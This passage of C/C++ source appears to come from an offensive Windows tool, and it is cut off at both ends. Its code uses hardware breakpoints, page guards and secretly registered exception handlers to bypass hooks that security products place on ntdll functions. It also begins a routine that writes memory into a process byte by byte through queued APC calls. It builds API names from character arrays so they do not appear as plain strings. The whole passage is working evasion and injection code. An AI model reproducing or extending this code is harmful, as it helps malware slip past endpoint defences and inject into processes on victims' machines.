		printf("[-] CreateThread() failed, error: %d\n", GetLastError());
		return FALSE;
	} else {
        printf("[+] CreateThread() success\n");
    }

    // NtCreateThreadEx_t pNtCreateThreadEx = (NtCreateThreadEx_t)dynamic::NotGetProcAddress(GetModuleHandle("ntdll.dll"), "NtCreateThreadEx");
	// set our hardware breakpoints before and after the syscall in the NtResumeThread stub
	//resolve the address of NtCreateThreadEx from ntdll using normal method: 
    // pNtCreateThreadEx = (NtCreateThreadEx_t)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtCreateThreadEx");
    pRtlUserThreadStart = (RtlUserThreadStart_t)GetProcAddress(GetModuleHandleA("ntdll.dll"), "RtlUserThreadStart");
    // check if pRtlUserThreadStart is a valid address: 
    if (!pRtlUserThreadStart) {
        printf("[-] Failed to locate RtlUserThreadStart.\n");
        return FALSE;
    } else {
        printf("[+] Located RtlUserThreadStart.\n");
    }
    SetSyscallBreakpoints((LPVOID)pRtlUserThreadStart, new_thread, TRUE);
    // SetSyscallBreakpoints((LPVOID)pNtCreateThreadEx, new_thread);

    printf("[+] Hardware breakpoints set\n");
	ResumeThread(new_thread); // Trigger the hardware breakpoint exception in a separate thread

	// wait until the SetThreadContext thread has finished before continuing
	WaitForSingleObject(new_thread, INFINITE);

	return TRUE;
}

/// TOGO: Page Guard handler: 
HANDLE page_guard_handle = NULL;
NtCreateThreadEx_t globalNtCreateThreadEx = NULL;

LONG WINAPI PageGuardHandler(EXCEPTION_POINTERS * e) {

	if (e->ExceptionRecord->ExceptionCode == STATUS_GUARD_PAGE_VIOLATION) {
        printf("[!] Guard page violation at address: %p\n", e->ExceptionRecord->ExceptionAddress);
        // NtCreateThreadEx_t pNtCreateThreadEx = (NtCreateThreadEx_t)dynamic::NotGetProcAddress(GetModuleHandle("ntdll.dll"), "NtCreateThreadEx");
        // get NtCreateThreadEx address from ntdll
        
        printf("[+] SetCreateThread address: %p\n", SetCreateThread);
        //Print Rdx value:
        printf("[+] Rdx value: %p\n", e->ContextRecord->Rdx);
        
        // LPVOID NtCreateThreadEx = (NtCreateThreadEx_t)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtCreateThreadEx");
		// if (e->ContextRecord->Rip == (DWORD64) SetCreateThread) {
        if (1 == 1) {
			printf("[!] Exception (%#llx)! Params:\n", e->ExceptionRecord->ExceptionAddress);
			printf("(1): %#llx | ", e->ContextRecord->Rcx);
			printf("(2): %#llx | ", e->ContextRecord->Rdx);
			printf("(3): %#llx | ", e->ContextRecord->R8);
			printf("(4): %#llx | ", e->ContextRecord->R9);
			printf("RSP = %#llx\n", e->ContextRecord->Rsp);
            //print the 5th argument:
            DWORD64 *fifthArgAddr = (DWORD64 *)(e->ContextRecord->Rsp + 0x28); 
            printf("[+] Rsp + 0x28 before change: %p\n", *fifthArgAddr);
            // *fifthArgAddr = (DWORD64)dllEntryPoint1; // Set your value
            // // print the value of 0x28 after the Rsp:
            // printf("[+] Rsp + 0x28 after change: %p\n", *fifthArgAddr);
			// getchar();
			//e->ContextRecord->Rip = (DWORD64) &prn;
            bool bRtlUserThreadStart = TRUE;
            LPVOID syscall_addr = NULL; 
            LPVOID syscall_ret_addr = NULL ;

            CONTEXT thread_context = { 0 };
            pRtlUserThreadStart = (RtlUserThreadStart_t)GetProcAddress(GetModuleHandleA("ntdll.dll"), "RtlUserThreadStart");
            // check if pRtlUserThreadStart is a valid address: 
            if (!pRtlUserThreadStart) {
                printf("[-] Failed to locate RtlUserThreadStart.\n");
                return FALSE;
            } else {
                printf("[+] Located RtlUserThreadStart.\n");
            }
            if (!FindSyscallInstruction((LPVOID)pRtlUserThreadStart, &syscall_addr, &syscall_ret_addr, TRUE, FALSE)) {
                return FALSE;
            }
            //print syscall_addr
            // printf("[+] syscall_addr should be equal to Found mov r8, rdx: %p\n", syscall_addr);
            //print syscall_ret_addr
            // if syscall is RtlUserThreadStart, we need to break on the instruction after the syscall of NtCreateThreadEx
            if (bRtlUserThreadStart) {
                LPVOID syscall_addr_temp;

                pBaseThreadInitThunk = (BaseThreadInitThunk_t)GetProcAddress(GetModuleHandleA("kernel32.dll"), "BaseThreadInitThunk");

                if(!FindSyscallInstruction((PVOID)pBaseThreadInitThunk, &syscall_addr_temp, &syscall_ret_addr, FALSE, TRUE)) {
                    return FALSE;
                } else {
                    printf("[+] Syscall ret instruction for BaseThreadInitThunk at 0x%llx\n", (DWORD64)syscall_ret_addr);
                }

            }
            // print syscall_ret_addr
            printf("[+] syscall_ret_addr should be equal to previous one!!!: %p\n", syscall_ret_addr);

            //get thread context from exception pointer
            // thread_context = *e->ContextRecord;

            // dr7_t dr7 = { 0 };

            // /// dr0 - dr3 to set breakpoint as debug address registers. 
            // dr7.dr0_local = 1; // set DR0 as an execute breakpoint
            // dr7.dr1_local = 1; // set DR1 as an execute breakpoint

            // // thread_context.ContextFlags = CONTEXT_ALL;
            // e->ContextRecord->ContextFlags = CONTEXT_ALL;
            // // print e->ContextRecord->Dr0:
            // printf("[+] e->ContextRecord->Dr0: %p\n", e->ContextRecord->Dr0);
            // printf("[+] e->ContextRecord->Dr0: %p\n", e->ContextRecord->Dr1);
            // // print syscall_addr abd syscall_addr:
            // // printf("[+] syscall_addr: %p\n", syscall_addr);
            // // printf("[+] syscall_ret_addr: %p\n", syscall_ret_addr);

            // // thread_context.Dr0 = (DWORD64)syscall_addr;     // set DR0 to break on syscall address
            // e->ContextRecord->Dr0 = (DWORD64)syscall_addr;
            // // thread_context.Dr1 = (DWORD64)syscall_ret_addr; // set DR1 to break on syscall ret address
            // e->ContextRecord->Dr1 = (DWORD64)syscall_ret_addr;
            // // thread_context.Dr7 = *(DWORD*)&dr7;
            // e->ContextRecord->Dr7 = *(DWORD*)&dr7;

            // CONTEXT context = *(ExceptionInfo->ContextRecord);
            CONTEXT* context = e->ContextRecord;
            // Define and initialize the DR7 structure
            dr7_t dr7 = { 0 };

            // Enable local breakpoints for DR0 and DR1
            dr7.dr0_local = 1;
            dr7.dr1_local = 1;
            // Set the address for the breakpoints in DR0 and DR1
            // Set the address for the breakpoints in DR0 and DR1
            context->Dr0 = (DWORD_PTR)syscall_addr;
            context->Dr1 = (DWORD_PTR)syscall_ret_addr;
            // Copy the DR7 structure into the context's Dr7 register
            context->Dr7 = *reinterpret_cast<DWORD_PTR*>(&dr7);
            // Print the changes for verification
            printf("[+] After change: e->ContextRecord->Dr0: %p\n", (void*)context->Dr0);
            printf("[+] After change: e->ContextRecord->Dr1: %p\n", (void*)context->Dr1);




            // DWORD64 *dr0 = (DWORD64 *)(e->ContextRecord->Dr0); 
            // printf("[+] Rsp + 0x28 before change: %p\n", *fifthArgAddr);
            // *dr0 = (DWORD64)syscall_addr; // Set your value
            // DWORD64 *dr1 = (DWORD64 *)(e->ContextRecord->Dr1); 
            // printf("[+] Rsp + 0x28 before change: %p\n", *fifthArgAddr);
            // *dr1 = (DWORD64)syscall_ret_addr; // Set your value
            // /// Now its Dr7's turn:
            // dr7_t *dr7_struct = (dr7_t *)(e->ContextRecord->Dr7);
            // dr7_struct->dr0_local = 1; // set DR0 as an execute breakpoint
            // dr7_struct->dr1_local = 1; // set DR1 as an execute breakpoint
            // print syscall_addr abd syscall_addr:

            // printf("[+] After change: e->ContextRecord->Dr0: %p\n", e->ContextRecord->Dr0);
            // printf("[+] After change: e->ContextRecord->Dr1: %p\n", e->ContextRecord->Dr1);
            // //disable the page guard:
            // DWORD old = 0;
            // VirtualProtect(reinterpret_cast<LPVOID>(globalNtCreateThreadEx), 1, PAGE_EXECUTE_READ, &old);
            // SetUnhandledExceptionFilter(BreakpointHandler);
            // AddVectoredExceptionHandler(1, &BreakpointHandler);
            // if(RemoveVectoredExceptionHandler(page_guard_handle)) {
            //     printf("[+] Page guard handler removed\n");
            // } else {
            //     printf("[-] Failed to remove page guard handler\n");
            // }
            // SetUnhandledExceptionFilter(BreakpointHandler);
            // if(breakpoint_handle) {
            //     printf("[+] Breakpoint handler added\n");
            // } else {
            //     printf("[-] Failed to add breakpoint handler\n");
            // }
            


		}
		return EXCEPTION_CONTINUE_EXECUTION;
	}
	return EXCEPTION_CONTINUE_SEARCH;
}



//TOzuo: 
BOOL BypassHookUsingPageGuard() {


	// set an exception handler to handle hardware pageg uards
    /// Page Guard handler: 
	DWORD old = 0;
	// register exception handler as first one
	// page_guard_handle = AddVectoredExceptionHandler(1, &PageGuardHandler);
    // if(page_guard_handle == NULL) {
    //     printf("[-] Failed to register page guard handler\n");
    //     return FALSE;
    // } else {
    //     printf("[+] Page guard handler registered\n");
    // }
    // SetUnhandledExceptionFilter(PageGuardHandler);

    // SetUnhandledExceptionFilter(BreakpointHandler);
    // AddVectoredExceptionHandler(1, &BreakpointHandler);


    //Call VEH --> VCH in sequence, the operations can be performed in either VEH or VCH or both in different combinations. 
    // expHandle = MyRtlAddVectoredExceptionHandler(1, &BreakpointHandlerVeh);
    // continueHandle = MyRtlAddVectoredContinueHandler(1, &BreakpointHandlerVch);
    // SetUnhandledExceptionFilter(BreakpointHandlerSeh);


    // NtCreateThreadEx_t globalNtCreateThreadEx = NULL;
    // NtCreateThreadEx_t pNtCreateThreadEx = (NtCreateThreadEx_t)dynamic::NotGetProcAddress(GetModuleHandle("ntdll.dll"), "NtCreateThreadEx");
	// globalNtCreateThreadEx = SetCreateThread;
    // printf("[+] EQUAL: SetCreateThread addr: %p\n", SetCreateThread);
    // set the PAGE_GUARD on pRtlUserThreadStart() function
	// VirtualProtect(reinterpret_cast<LPVOID>(&CreateThread), 1, PAGE_EXECUTE_READ | PAGE_GUARD, &old);
    pNtCreateThreadEx = (NtCreateThreadEx_t)dynamic::NotGetProcAddress(GetModuleHandle("ntdll.dll"), "NtCreateThreadEx");
    pRtlUserThreadStart = (RtlUserThreadStart_t)GetProcAddress(GetModuleHandleA("ntdll.dll"), "RtlUserThreadStart");
    // LPVOID adjustedAddress = reinterpret_cast<LPVOID>(reinterpret_cast<uintptr_t>(pRtlUserThreadStart) - 200);


    // VirtualProtect(reinterpret_cast<LPVOID>(WaitForSingleObject), 1, PAGE_EXECUTE_READ | PAGE_GUARD, &old);
    if(VirtualProtect(reinterpret_cast<LPVOID>(pRtlUserThreadStart), 1, PAGE_EXECUTE_READ | PAGE_GUARD, &old)) {
        printf("[+] PAGE_GUARD set before pRtlUserThreadStart API. \n");
    } else {
        printf("[-] Failed to set PAGE_GUARD\n");
    }

    //print pRtlUserThreadStart:
    printf("[+] pRtlUserThreadStart: %p\n", pRtlUserThreadStart);
    printf("[+] press any key to continue\n");
    getchar();



    // InjectHandlerEntry((PVOID)&vehExceptionHandler, 1);
    // VEH is usually hooked, so we use the function: 
    expHandle = MyRtlAddVectoredExceptionHandler(1, NULL);
    // remove the handler from the list using removeVectoredExceptionHandler
    // InjectHandlerEntry((PVOID)NULL, 1);
    InjectHandlerEntry((PVOID)BreakpointHandlerVeh, 1);
    RemoveVectoredExceptionHandler(expHandle);



    // continueHandle = MyRtlAddVectoredContinueHandler(1, &BreakpointHandlerVch);
    continueHandle = MyRtlAddVectoredContinueHandler(1, NULL);
    // InjectHandlerEntry((PVOID)NULL, 0);
    InjectHandlerEntry((PVOID)&BreakpointHandlerVch, 0);
    RemoveVectoredContinueHandler(continueHandle);

    // InjectVEHEntry();
	// // Enable the process VEH, this will also return the imageBaseAddress value from the PEB. 
    // // Without this function, the hanlder will not be enabled despite added to the hanlder lists. 
	LPVOID imageBaseAddress = ModifyHandlers(GetCurrentProcess(), 1);
    if (imageBaseAddress == NULL) {
        printf("[-] Failed to enable VEH and VCH in desginated process\n");
        return 1;
    } else {
        printf("[+] Succseefully enabled VEH and VCH in desginated process\n");
        getchar();
    }


    // To trigger page guard exception 1:
    // // volatile int *ptr = (volatile int *)pRtlUserThreadStart;
    // // int value = *ptr;  // TRIGGERS PAGE_GUARD EXCEPTION 
    // BYTE buffer[16] = {0};  // Buffer to hold read data
    // SIZE_T bytesRead = 0;

    // // Get a function pointer to NtReadVirtualMemory
    // pNtReadVirtualMemory NtReadVirtualMemory = (pNtReadVirtualMemory)GetProcAddress(
    //     GetModuleHandleA("ntdll.dll"), "NtReadVirtualMemory");

    // if (!NtReadVirtualMemory) {
    //     printf("[-] Failed to get NtReadVirtualMemory address. Error: %d\n", GetLastError());

    // }

    // HANDLE hProcess = GetCurrentProcess();
    // NTSTATUS status = NtReadVirtualMemory(hProcess, (PVOID)pRtlUserThreadStart, &buffer, 8, &bytesRead);



    // if (status == 0) {  // STATUS_SUCCESS (0x0)
    //     printf("[+] Successfully read %llu bytes from 0x%p\n", (unsigned long long)bytesRead, pRtlUserThreadStart);
    //     printf("[+] Data: ");
    //     for (SIZE_T i = 0; i < bytesRead; i++) {
    //         printf("%02X ", buffer[i]);
    //     }
    //     printf("\n");
    // } else {
    //     printf("[-] NtReadVirtualMemory failed. NTSTATUS: 0x%X\n", status);
    // }


    // WaitForSingleObject(GetCurrentThread(), INFINITE);

    // trigger page guard exception 2:
    // printf("[+] PAGE_GUARD set\n");

    ///////////////////////////////////////////////

    // const char getLib[] = { 'n', 't', 'd', 'l', 'l', 0 };

    // pRtlExitUserThread ExitUserThread = (pRtlExitUserThread)dynamic::NotGetProcAddress(GetModuleHandle(getLib), "RtlExitUserThread");

	// // set an exception handler to handle hardware pageg uards
	// SetUnhandledExceptionFilter(BreakpointHandler);
	// create a new thread to call SetThreadContext in a suspended state so we can modify its own context
	HANDLE new_thread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)ExitThread,
									 NULL, CREATE_SUSPENDED, NULL);
	if (!new_thread) {
		printf("[-] CreateThread() failed, error: %d\n", GetLastError());
		return FALSE;
	} else {
        printf("[+] CreateThread() success\n");
    }

    //de-register AddVectoredExceptionHandler
    g_thread_handle2 = new_thread; 
    // NtCreateThreadEx_t pNtCreateThreadEx = (NtCreateThreadEx_t)dynamic::NotGetProcAddress(GetModuleHandle("ntdll.dll"), "NtCreateThreadEx");
	// set our hardware breakpoints before and after the syscall in the NtResumeThread stub
	//resolve the address of NtCreateThreadEx from ntdll using normal method: 
    // pNtCreateThreadEx = (NtCreateThreadEx_t)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtCreateThreadEx");
    // pRtlUserThreadStart = (RtlUserThreadStart_t)GetProcAddress(GetModuleHandleA("ntdll.dll"), "RtlUserThreadStart");
    // // check if pRtlUserThreadStart is a valid address: 
    // if (!pRtlUserThreadStart) {
    //     printf("[-] Failed to locate RtlUserThreadStart.\n");
    //     return FALSE;
    // } else {
    //     printf("[+] Located RtlUserThreadStart.\n");
    // }


    // SetSyscallBreakpoints((LPVOID)pRtlUserThreadStart, new_thread, TRUE);
    // SetSyscallBreakpoints((LPVOID)pNtCreateThreadEx, new_thread);

    printf("[+] Hardware breakpoints set\n");
	ResumeThread(new_thread); // Trigger the hardware breakpoint exception in a separate thread

	// wait until the SetThreadContext thread has finished before continuing
	WaitForSingleObject(new_thread, INFINITE);

	return TRUE;
}

/// TOGO: Forced exception to change the debug registers Dr0, Dr1 and Dr7 in thread context without use SetThreadContext

// // exception handler for forced exception
// LONG WINAPI ExceptionHandler(PEXCEPTION_POINTERS e)
// {
// 	// static CONTEXT fake_context = { 0 };
    
// 	printf("[+] Exception handler triggered at address: 0x%llx\n", (DWORD64)
// 		   e->ExceptionRecord->ExceptionAddress);
//     // printf("[+] Exception code: 0x%lx\n", e->ExceptionRecord->ExceptionCode);
//     // printf("[+] Exception flags: 0x%lx\n", e->ExceptionRecord->ExceptionFlags);
//     // printf("[+] Exception address: 0x%llx\n", (DWORD64)e->ExceptionRecord->ExceptionAddress);
//     // printf("[+] Exception information: 0x%llx\n", (DWORD64)e->ExceptionRecord->ExceptionInformation);
//     // printf("[+] Exception number parameters: %d\n", e->ExceptionRecord->NumberParameters);
//     // printf("[+] Exception context record: 0x%llx\n", (DWORD64)e->ContextRecord);
//     // printf("[+] Exception context record flags: 0x%lx\n", e->ContextRecord->ContextFlags);
//     // printf("[+] Exception context record address: 0x%llx\n", (DWORD64)e->ContextRecord->Rip);

//     // Return Rax with NTSTATUS success, so we can exit the exception handler:
//     // e->ContextRecord->Rax = 0x0;
//     printf("[+] Exception handler finished\n");
//     //print e->ContextRecord->Rsp + 0x28:
//     printf("[+] Exception handler finished, Rsp + 0x28: 0x%llx\n", (DWORD64)e->ContextRecord->Rsp + 0x28);
//     //Print R8 register: 
//     printf("[+] Exception handler finished, R8: 0x%llx\n", (DWORD64)e->ContextRecord->R8);
    

// 	// set an exception handler to handle hardware breakpoints
// 	SetUnhandledExceptionFilter(BreakpointHandler);

// 	// create a new thread to call SetThreadContext in a suspended state so we can modify its own context
// 	HANDLE new_thread = CreateThread(NULL, 0, SetCreateThread,
// 									 NULL, CREATE_SUSPENDED, NULL);
// 	if (!new_thread) {
// 		printf("[-] CreateThread() failed, error: %d\n", GetLastError());
// 		return FALSE;
// 	} else {
//         printf("[+] CreateThread() success\n");
//     }

//     // NtCreateThreadEx_t pNtCreateThreadEx = (NtCreateThreadEx_t)dynamic::NotGetProcAddress(GetModuleHandle("ntdll.dll"), "NtCreateThreadEx");
// 	// set our hardware breakpoints before and after the syscall in the NtResumeThread stub
// 	//resolve the address of NtCreateThreadEx from ntdll using normal method: 
//     // pNtCreateThreadEx = (NtCreateThreadEx_t)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtCreateThreadEx");
//     pRtlUserThreadStart = (RtlUserThreadStart_t)GetProcAddress(GetModuleHandleA("ntdll.dll"), "RtlUserThreadStart");
//     // check if pRtlUserThreadStart is a valid address: 
//     if (!pRtlUserThreadStart) {
//         printf("[-] Failed to locate RtlUserThreadStart.\n");
//         return FALSE;
//     } else {
//         printf("[+] Located RtlUserThreadStart.\n");
//     }
//     // SetSyscallBreakpoints((LPVOID)pRtlUserThreadStart, new_thread, TRUE);
//     // SetSyscallBreakpoints((LPVOID)pNtCreateThreadEx, new_thread);

// /////////////////////
// ////////////////////////
//     bool bRtlUserThreadStart = TRUE;
//     LPVOID syscall_addr = NULL; 
//     LPVOID syscall_ret_addr = NULL ;

//     CONTEXT thread_context = { 0 };
//     HMODULE ntdll = GetModuleHandleA("ntdll.dll");

//     if (!FindSyscallInstruction((LPVOID)pRtlUserThreadStart, &syscall_addr, &syscall_ret_addr, TRUE, FALSE)) {
//         return FALSE;
//     }



//     //print syscall_addr
//     // printf("[+] syscall_addr should be equal to Found mov r8, rdx: %p\n", syscall_addr);
//     //print syscall_ret_addr
//     // if syscall is RtlUserThreadStart, we need to break on the instruction after the syscall of NtCreateThreadEx
//     if (bRtlUserThreadStart) {
//         LPVOID syscall_addr_temp;

//         pBaseThreadInitThunk = (BaseThreadInitThunk_t)GetProcAddress(GetModuleHandleA("kernel32.dll"), "BaseThreadInitThunk");

//         if(!FindSyscallInstruction((PVOID)pBaseThreadInitThunk, &syscall_addr_temp, &syscall_ret_addr, FALSE, TRUE)) {
//             return FALSE;
//         } else {
//             printf("[+] Syscall ret instruction for BaseThreadInitThunk at 0x%llx\n", (DWORD64)syscall_ret_addr);
//         }

//     }
//     // print syscall_ret_addr
//     printf("[+] syscall_ret_addr should be equal to previous one!!!: %p\n", syscall_ret_addr);
//     // thread_context.ContextFlags = CONTEXT_FULL;

//     // // get the current thread context (note, this must be a suspended thread)
//     // if (!GetThreadContext(new_thread, &thread_context)) {
//     //     printf("[-] GetThreadContext() failed, error: %d\n", GetLastError());
//     //     return FALSE;
//     // }

//     //get thread context from exception pointer
//     // thread_context = *e->ContextRecord;

//     dr7_t dr7 = { 0 };

//     /// dr0 - dr3 to set breakpoint as debug address registers. 
//     dr7.dr0_local = 1; // set DR0 as an execute breakpoint
//     dr7.dr1_local = 1; // set DR1 as an execute breakpoint

//     // thread_context.ContextFlags = CONTEXT_ALL;
//     e->ContextRecord->ContextFlags = CONTEXT_ALL;

//     // print e->ContextRecord->Dr0:
//     printf("[+] e->ContextRecord->Dr0: %p\n", e->ContextRecord->Dr0);
//     printf("[+] e->ContextRecord->Dr0: %p\n", e->ContextRecord->Dr1);
//     // print syscall_addr abd syscall_addr:
//     // printf("[+] syscall_addr: %p\n", syscall_addr);
//     // printf("[+] syscall_ret_addr: %p\n", syscall_ret_addr);

//     // thread_context.Dr0 = (DWORD64)syscall_addr;     // set DR0 to break on syscall address
//     e->ContextRecord->Dr0 = (DWORD64)syscall_addr;
//     // thread_context.Dr1 = (DWORD64)syscall_ret_addr; // set DR1 to break on syscall ret address
//     e->ContextRecord->Dr1 = (DWORD64)syscall_ret_addr;
//     // thread_context.Dr7 = *(DWORD*)&dr7;
//     e->ContextRecord->Dr7 = *(DWORD*)&dr7;

//     // use SetThreadContext to update the debug registers
//     // if (!SetThreadContext(new_thread, &thread_context)) {
//     //     printf("SetThreadContext() failed, error: %d\n", GetLastError());
//     // }

//     // printf("Hardware breakpoints set\n");

// ////////////////////
// //////////////////

//     printf("[+] Hardware breakpoints set\n");
// 	ResumeThread(new_thread); // Trigger the hardware breakpoint exception in a separate thread

// 	// wait until the SetThreadContext thread has finished before continuing
// 	WaitForSingleObject(new_thread, INFINITE);
	
// // 	// DWORD64* stack_ptr = (DWORD64*)e->ContextRecord->Rsp;
	
// // 	// // iterate first 300 stack variables looking for our fake address
// // 	// for (int i = 0; i < 300; i++) {
// // 	// 	if (*stack_ptr == 0x1337) {
// // 	// 		// replace the fake address with the real one
// // 	// 		*stack_ptr = (DWORD64)g_thread_context;

// // 	// 		printf("Fixed stack value at RSP+(0x8*0x%x) (0x%llx): 0x%llx\n", 
// // 	// 			   i, (DWORD64)stack_ptr, (DWORD64)*stack_ptr);
// // 	// 	}
// // 	// 	stack_ptr++;
// // 	// }

// // 	// e->ContextRecord->Rbx = (DWORD64)&fake_context;

// 	return EXCEPTION_CONTINUE_EXECUTION;
// }

// BOOL BypassHookUsingForcedException() {
// 	// set an exception handler to handle hardware breakpoints
// 	SetUnhandledExceptionFilter(ExceptionHandler);


//     HANDLE new_thread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)0x888888,
//                                      NULL, CREATE_SUSPENDED, NULL);
// 	// call SetThreadContext with an invalid address to trigger exception
// 	if (!SetThreadContext(new_thread, (CONTEXT*)0x8888)) {
// 		printf("[?] SetThreadContext() failed, error: %d\n", GetLastError());
// 	}
//     // Resume the thread to allow the invalid operation to potentially execute
//     ResumeThread(new_thread);
//     WaitForSingleObject(new_thread, INFINITE);

//     // printf("[+] SetUnhandledExceptionFilter passed \n");
//     // How to make the exception to be triggered:
//     // create a new thread with wrong address to trigger the exception:




//     // if (!new_thread) {
//     //     printf("[-] CreateThread() failed, error: %d\n", GetLastError());
//     //     return FALSE;
//     // } else {
//     //     printf("[+] CreateThread() success\n");
//     // }
//     // if(!CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)0x88888, NULL, CREATE_SUSPENDED, NULL)) {
//     //     printf("[?] CreateThread() failed, error: %d\n", GetLastError());
//     // }
    

// 	return TRUE;
// }
// exception handler for forced exception


////////////////////////// Breakpoint test end

/////////////////////////////////////// APC Write:


// Declaration of undocumented functions and structures

// https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/ne-processthreadsapi-queue_user_apc_flags
typedef enum _QUEUE_USER_APC_FLAGS {
  QUEUE_USER_APC_FLAGS_NONE,
  QUEUE_USER_APC_FLAGS_SPECIAL_USER_APC,
  QUEUE_USER_APC_CALLBACK_DATA_CONTEXT
} QUEUE_USER_APC_FLAGS;


// typedef ULONG (NTAPI *NtQueueApcThread_t)(HANDLE ThreadHandle, PVOID ApcRoutine, PVOID ApcRoutineContext, PVOID ApcStatusBlock, PVOID ApcReserved);
typedef NTSTATUS (NTAPI *NtQueueApcThreadEx2_t)(
    HANDLE ThreadHandle,
    HANDLE UserApcReserveHandle, // Additional parameter in Ex2
    QUEUE_USER_APC_FLAGS QueueUserApcFlags, // Additional parameter in Ex2
    PVOID ApcRoutine,
    PVOID SystemArgument1 OPTIONAL,
    PVOID SystemArgument2 OPTIONAL,
    PVOID SystemArgument3 OPTIONAL
);


DWORD GetCurrentThreadID_TEB();

// Function to write memory using APCs with an option to choose the thread creation method
DWORD WriteProcessMemoryAPC(HANDLE hProcess, BYTE *pAddress, BYTE *pData, DWORD dwLength, BOOL useRtlCreateUserThread, BOOL bUseCreateThreadpoolWait) {
    HANDLE hThread = NULL;
    HANDLE event = CreateEvent(NULL, FALSE, TRUE, NULL);

    const char getLib[] = { 'n', 't', 'd', 'l', 'l', 0 };
    // const char NtQueueFutureApcStr[] = { 'N', 't', 'Q', 'u', 'e', 'u', 'e', 'A', 'p', 'c', 'T', 'h', 'r', 'e', 'a', 'd', 0 };
    const char NtQueueFutureApcEx2Str[] = { 'N', 't', 'Q', 'u', 'e', 'u', 'e', 'A', 'p', 'c', 'T', 'h', 'r', 'e', 'a', 'd', 'E', 'x', '2', 0 };
    const char NtFillFutureMemoryStr[] = { 'R', 't', 'l', 'F', 'i', 'l', 'l', 'M', 'e', 'm', 'o', 'r', 'y', 0 };
    // NtQueueApcThread_t pNtQueueApcThread = (NtQueueApcThread_t)dynamic::NotGetProcAddress(GetModuleHandle(getLib), NtQueueFutureApcStr);
    NtQueueApcThreadEx2_t pNtQueueApcThread = (NtQueueApcThreadEx2_t)dynamic::NotGetProcAddress(GetModuleHandle(getLib), NtQueueFutureApcEx2Str);
    void *pRtlFillMemory = (void*)dynamic::NotGetProcAddress(GetModuleHandle(getLib), NtFillFutureMemoryStr);


    // TODO, Change state: 
    pNtCreateThreadStateChange NtCreateThreadStateChange = (pNtCreateThreadStateChange)dynamic::NotGetProcAddress(GetModuleHandle(getLib), "NtCreateThreadStateChange"); 
    pNtChangeThreadState NtChangeThreadState = (pNtChangeThreadState)dynamic::NotGetProcAddress(GetModuleHandle(getLib), "NtChangeThreadState");
    
    pNtCreateProcessStateChange NtCreateProcessStateChange = (pNtCreateProcessStateChange)dynamic::NotGetProcAddress(GetModuleHandle(getLib), "NtCreateProcessStateChange");
    pNtChangeProcessState NtChangeProcessState = (pNtChangeProcessState)dynamic::NotGetProcAddress(GetModuleHandle(getLib), "NtChangeProcessState");



    if (!pNtQueueApcThread || !pRtlFillMemory) {
        printf("[-] Failed to locate required functions.\n");
        return 1;
    }

    if(!bUseCreateThreadpoolWait){
        if (useRtlCreateUserThread) {
            pRtlCreateUserThread RtlCreateUserThread = (pRtlCreateUserThread)dynamic::NotGetProcAddress(GetModuleHandle("ntdll.dll"), "RtlCreateUserThread");
            if (!RtlCreateUserThread) {
                printf("[-] Failed to locate RtlCreateUserThread.\n");
                return 1;
            }

            CLIENT_ID ClientID;
            NTSTATUS ntStatus = RtlCreateUserThread(
                hProcess,
                NULL, // SecurityDescriptor
                TRUE, // CreateSuspended - not directly supported, handle suspension separately
                0, // StackZeroBits
                NULL, // StackReserved
                NULL, // StackCommit
                (PVOID)(ULONG_PTR)ExitThread, // StartAddress, using ExitThread as a placeholder
                NULL, // StartParameter
                &hThread,
                &ClientID);

            if (ntStatus != STATUS_SUCCESS) {
                printf("[-] RtlCreateUserThread failed: %x\n", ntStatus);
                return 1;
            }
            printf("[+] RtlCreateUserThread succeeded\n");
            // Immediately suspend the thread to mimic the NT_CREATE_THREAD_EX_SUSPENDED flag behavior
            // SuspendThread(hThread);
        } else {
            NtCreateThreadEx_t pNtCreateThreadEx = (NtCreateThreadEx_t)dynamic::NotGetProcAddress(GetModuleHandle("ntdll.dll"), "NtCreateThreadEx");
            
            if (!pNtCreateThreadEx) {
                printf("[-] Failed to locate NtCreateThreadEx.\n");
                return 1;
            }

            ULONG status = pNtCreateThreadEx(
                &hThread,
                NT_CREATE_THREAD_EX_ALL_ACCESS,
                NULL,
                hProcess,
                (PVOID)(ULONG_PTR)ExitThread,
                NULL,
                NT_CREATE_THREAD_EX_SUSPENDED,
                0,
                0,
                0,
                NULL);

            if (status != 0) {
                printf("[-] Failed to create remote thread: %lu\n", status);
                return 1;
            }
            printf("[+] NtCreateThreadEx succeeded\n");
        }
    } else {
        hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, GetCurrentThreadID_TEB());
        if(!hThread) {
            printf("[-] Failed to open thread: %lu\n", GetLastError());
            return 1;
        }
        
    }


    // TODO: Change state:
    // HANDLE ThreadStateChangeHandle = NULL;
    // HANDLE duplicateThreadHandle = NULL;

    // BOOL success = DuplicateHandle(
    //     GetCurrentProcess(), // Source process handle
    //     hThread, // Source handle to duplicate
    //     GetCurrentProcess(), // Target process handle
    //     &duplicateThreadHandle, // Pointer to the duplicate handle
    //     THREAD_ALL_ACCESS, // Desired access (0 uses the same access as the source handle)
    //     FALSE, // Inheritable handle option
    //     0 // Options
    // );

    // NTSTATUS status = NtCreateThreadStateChange(
    //     &ThreadStateChangeHandle, // This handle is used in NtChangeThreadState
    //     MAXIMUM_ALLOWED,            // Define the access you need
    //     NULL,                      // ObjectAttributes, typically NULL for basic usage
    //     duplicateThreadHandle,              // Handle to the thread you're working with
    //     0                          // Reserved, likely 0 for most uses
    // );
    // if (status != STATUS_SUCCESS) {
    //     printf("[-] Failed to create thread state change: %x\n", status);
    //     return 1;
    // } else {
    //     printf("[+] Thread state change created\n");
    // }   

    // status = NtChangeThreadState(ThreadStateChangeHandle, duplicateThreadHandle, 1, NULL, 0, 0);
    // if (status != STATUS_SUCCESS) {
    //     printf("[-] Failed to sus thread: %x\n", status);
    //     // return 1;
    // } else {
    //     printf("[+] Thread suspended\n");
    // };



    QUEUE_USER_APC_FLAGS apcFlags = bUseCreateThreadpoolWait ? QUEUE_USER_APC_FLAGS_SPECIAL_USER_APC : QUEUE_USER_APC_FLAGS_NONE;

    for (DWORD i = 0; i < dwLength; i++) {
        BYTE byte = pData[i];

        // Print only for the first and last byte
        if (i == 0 || i == dwLength - 1) {
            if(i == 0) {
